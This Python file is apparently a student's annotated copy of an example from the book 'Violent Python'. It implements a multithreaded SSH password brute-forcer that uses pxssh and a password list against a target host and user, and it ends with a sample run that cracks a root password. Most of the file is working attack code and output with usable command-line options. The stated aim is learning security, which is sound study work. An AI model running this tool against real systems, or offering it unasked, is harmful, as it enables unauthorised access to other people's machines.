'''
This file is part of examples shown in a book
"Violent Python Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers"
Most of the code is copied as is, or with minor changes to make naming easier to understand and some
comments may have been added where i explain to myself how everything works ( the code is not just blindly copied ).
The purpose of these files is for me to understand how the code works and become better at the security field.
------------
Antti Ruhala, Tampere University of Technology
------------
'''

'''
Third party python module Pexpect is used to interact with SSH
http://pexpect. sourceforge.net
'''

import pxssh
import optparse
import time
from threading import *

# global variables for "statistics"
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False # means the correct password
Fails = 0

def connect(host, user, password, release):
    # the release is used for recursive calls
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True

    except Exception as e:
        # ssh server is maxed out at number of connections
        # we wait and try again later
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        # pxssh is having difficulty obtaining command prompt
        # we wait and try again later
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)

    finally:
        # this ends the tries with the same password
        if release: connection_lock.release()

def main():
    parser = optparse.OptionParser('usage%prog '
            + '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost',type='string',
            help = 'specify target host')
    parser.add_option('-F',dest='passwdFile', type='string',
            help = 'specify password file')
    parser.add_option('-u', dest='user', type='string',
            help = 'specify the user')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host == None or passwdFile == None or user == None:
        print(parser.usage)
        exit(0)
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print("[*] Exiting: Password Found")
            exit(0)
        if Fails > 5:
            print("[!] Too many Socket Timeouts")
            exit(0)
        connection_lock.acquire() # this is our semaphore (5)
        password = line.strip('\r').strip('\n')
        print("[-] Testing: "+ str(password))
        t = Thread(target=connect, args=(host, user,
                                           password, True))
        child = t.start()

if __name__ == '__main__':
    main()

'''
Example run:

 attacker# python PxsshBruteForce.py -H 10.10.1.36 -u root -F pass.txt
 [-] Testing: 123456 
 [-] Testing: 12345 
 [-] Testing: 123456789 
 [-] Testing: password 
 [-] Testing: iloveyou 
 [-] Testing: princess 
 [-] Testing: 1234567 
 [-] Testing: alpine 
 [-] Testing: password1 
 [-] Testing: soccer 
 [-] Testing: anthony 
 [-] Testing: friends 
 [+] Password Found: alpine 
 [-] Testing: butterfly 
 [*] Exiting: Password Found
'''